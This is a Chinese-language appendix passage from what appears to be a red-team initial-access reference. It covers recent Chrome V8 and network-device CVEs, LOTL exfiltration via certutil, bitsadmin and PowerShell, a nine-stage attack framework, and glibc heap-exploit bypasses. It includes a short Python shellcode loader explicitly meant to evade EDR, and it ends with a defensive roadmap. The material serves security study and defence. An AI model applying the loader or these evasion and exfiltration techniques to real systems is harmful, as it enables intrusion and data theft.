| CVE-2025-10585 | Type Confusion | 高 | **野外利用** | V8 类型混淆→堆损坏→任意代码执行；Google TAG 2025-09-16 发现；Chrome < 140.0.7339.185 |
| CVE-2025-2135 | Type Confusion | 高 | 已修补+分析 | V8 类型混淆，堆损坏；Chrome < 134.0.6998.88；公开代码分析 |
| CVE-2025-2783 | 未公开 | 高 | **野外利用** | Chrome 零日 |
| CVE-2025-4664 | 未公开 | 高 | **PoC+野外** | Chrome 零日 |
| CVE-2025-5419 | 未公开 | 高 | **PoC+野外** | Chrome 零日 |
| CVE-2025-6554 | 未公开 | 高 | **野外利用** | Chrome 零日 |
| CVE-2025-6558 | 未公开 | 高 | **野外利用** | Chrome 零日 |
| CVE-2025-8010 | RCE | 高 | 已披露 | V8 远程代码执行 |

```
趋势分析:
  - Type Confusion 是 2025 年 V8 最主要漏洞类型
  - Chrome 2025 年已有 6 个零日被野外利用或 PoC
  - 所有 Chromium 内核浏览器均受影响（Edge/Brave/Opera/Vivaldi）
  - 利用链模式: JIT 类型混淆 → OOB → addrof/fakeobj → arb r/w → shellcode
```

---

### C.4 Shellcode 加载器技术演进（2025）

```python
# 现代 Shellcode 加载器 — 绕过 EDR 检测

# 1. RW→RX 权限转换（避免 RWX 分配触发 EDR）
# 不使用: VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
# 改用:
import ctypes
kernel32 = ctypes.windll.kernel32

# 分配 RW 内存
ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x1000, 0x04)  # PAGE_READWRITE
ctypes.memmove(ptr, shellcode, len(shellcode))
# 转换为 RX
old = ctypes.c_ulong()
kernel32.VirtualProtect(ptr, len(shellcode), 0x20, ctypes.byref(old))  # PAGE_EXECUTE_READ

# 2. NtCreateSection + NtMapViewOfSection（pagefile 内存绕过 VirtualAlloc 监控）
# 使用 pagefile 支持的内存区域而非 VirtualAlloc

# 3. 直接系统调用（跳过 ntdll.dll 中被 EDR hook 的用户态存根）
# SysWhispers4 / Hell's Gate / FreshyCalls 等工具生成直接 syscall stub
```

---

### C.5 2025-2026 初始访问综合 CVE 速查

| CVE | 产品 | 类型 | CVSS | 状态 | 初始访问关联 |
|-----|------|------|------|------|-------------|
| CVE-2025-10585 | Chrome V8 | Type Confusion | 高 | 野外利用 | 浏览器驱动攻击 |
| CVE-2025-2135 | Chrome V8 | Type Confusion | 高 | 已修补 | 浏览器驱动攻击 |
| CVE-2025-64155 | FortiSIEM | RCE | 9.8 | 野外利用 | 边界设备利用 |
| CVE-2025-24813 | Apache Tomcat | Partial PUT RCE | 高 | 野外利用 | 公开应用利用 |
| CVE-2024-55591 | Fortinet | 认证绕过 | 9.6 | 野外利用 | VPN/网关利用 |
| CVE-2025-29927 | Next.js | 中间件授权绕过 | 高 | 已修补 | Web 框架利用 |
| CVE-2023-34362 | MOVEit Transfer | SQLi→RCE | 9.8 | 野外利用 | Cl0p 勒索软件初始访问（影响延续至 2025） |

---

### C.6 Living Off The Land（LOTL）初始访问

```
Volt Typhoon 模式 — 仅使用系统自带工具:
  1. 初始访问: 利用 VPN/路由器漏洞或凭证获取初始访问
  2. 持久化: 修改路由器固件/配置（无恶意文件）
  3. 横向移动: PowerShell/WMI/certutil/rundll32/mshta
  4. 数据外泄: certutil -urlcache/ bitsadmin/ PowerShell Invoke-WebRequest

检测策略:
  - 行为分析（非签名匹配）
  - 异常进程链检测（父-子进程关系）
  - 网络连接频率分析（信标检测）
  - PowerShell 日志记录 (ScriptBlock Logging Event ID 4104)

关键 LOLAS 工具持续更新: https://lolbas-project.github.io/
```

---

### C.7 红队初始访问 9 阶段框架（2025）

```
阶段 1: 载荷开发
  HTML Smuggling → ISO/VHD 容器 → LNK/DLL 侧加载/ClickOnce
  → AMSI 绕过 → ETW unhook → Shellcode（见 C.4）

阶段 2: 钓鱼/鱼叉钓鱼
  QR 码钓鱼（Quishing）/ Teams 钓鱼 / 加密 ZIP 附件

阶段 3: AiTM & MFA 绕过
  Evilginx Pro 4.x / 设备代码钓鱼（见 C.2.2）

阶段 4: 凭证攻击
  密码喷洒 / 凭证填充 / AWS API Gateway IP 轮换（CredMaster）

阶段 5: 利用公开应用（28.7% 初始入侵来源）
  VPN/网关/Ivanti/Fortinet 设备（见 CVE 速查 C.5）

阶段 6: 语音钓鱼（Vishing）
  Scattered Spider 技术包: SIM swap + push bombing + help desk 社工

阶段 7: 供应链攻击
  3CX/Lazarus 模式: 利用有效签名证书分发恶意更新

阶段 8: 物理访问
  Dropbox/USB/BadUSB（Rubber Ducky/Flipper Zero）

阶段 9: 水坑攻击
  目标常用网站植入恶意 JS → 浏览器漏洞利用链
```

---

### C.8 二进制利用 glibc 堆保护绕过演进（2025）

```
glibc 保护与绕过时间线:
  glibc 2.32: Safe-linking → 绕过: 泄露堆地址恢复指针
  glibc 2.34: __malloc_hook/__free_hook 移除 → 转向: IO_FILE exploit
  glibc 2.35+: tcache key保护 → 绕过: 堆地址泄露恢复 key

现代堆利用路径（2025）:
  1. House of 系列: House of Apple/House of Emma/House of Husk
     → 利用 _IO_wfile_overflow → _IO_wdoallocbuf →调用链
  2. IO_FILE exploit:
     __malloc_hook 不可用后转向伪造 FILE 结构
     → _IO_OVERFLOW 触发 → 调用可控函数指针
  3. Largebin attack:
     任意地址写堆地址 → 修改 _IO_list_all → 触发 IO flush

工具:
  - pwntools: fmtstr_payload / ROP / ELF 分析
  - one_gadget: glibc one-shot RCE gadget 搜索
  - ROPgadget / ropper: gadget 搜索
  - gdb + pwndbg / gef: 动态调试
```

---

### C.9 中文社区精华参考

| 来源 | 关键内容 |
|------|----------|
| FreeBuf | "2025年 Chrome 浏览器八大 0Day 漏洞"详细分析、React2Shell 漏洞部署 Linux 后门 |
| 先知社区 (xz.aliyun.com) | ATT&CK 初始访问技术持续分析、ATT&CK TA0001 技术解读 |
| 安全客 | APT 组织初始访问技术画像、LOTL 检测策略 |
| 奇安信 | 2025 漏洞态势报告、初始访问路径统计 |
| 0xDbgMan | 现代初始访问入侵技术完整指南（9 阶段框架） |
| dk47os3r/hongduiziliao | 红队资料整合项目，2025 攻防资料持续更新 |

---

### C.10 防御升级路线图

```
P0 — 立即实施（0-30天）:
  □ 部署 FIDO2/Passkey（唯一有效对抗 AiTM 钓鱼的 MFA）
  □ 启用 Chrome 企业版自动更新策略（应对 V8 零日）
  □ 配置 Teams 外部租户消息限制
  □ 邮件网关启用 QR 码图像 OCR 扫描

P1 — 短期（30-90天）:
  □ 部署条件访问策略: 合规设备 + 命名位置 + 风险 CA
  □ 设备代码流程监控（KQL 查询见 C.2.2）
  □ HSTS preload 提交所有企业域名
  □ LNK/VHD MOTW 绕过缓解（AppLocker 规则）

P2 — 中期（90-180天）:
  □ 二进制加固编译标准推广（见 §6.3 全部保护启用）
  □ DNS 过滤 + CT 日志监控（检测为目标域签发的可疑证书）
  □ LOLAS 行为检测规则集部署（Sysmon + Sigma）
  □ 用户安全意识培训: QR 码钓鱼 + Teams 钓鱼 + 设备代码钓鱼

P3 — 持续优化:
  □ 初始访问模拟演练（紫队 Atomic Red Team T1566/T1189/T1190）
  □ 浏览器沙箱增强（Site Isolation + Strict Origin Isolation）
  □ 供应链安全: SBOM + 签名验证 + 实时包监控
  □ 内核保护: KASLR + SMEP + SMAP + KPTI 验证
```
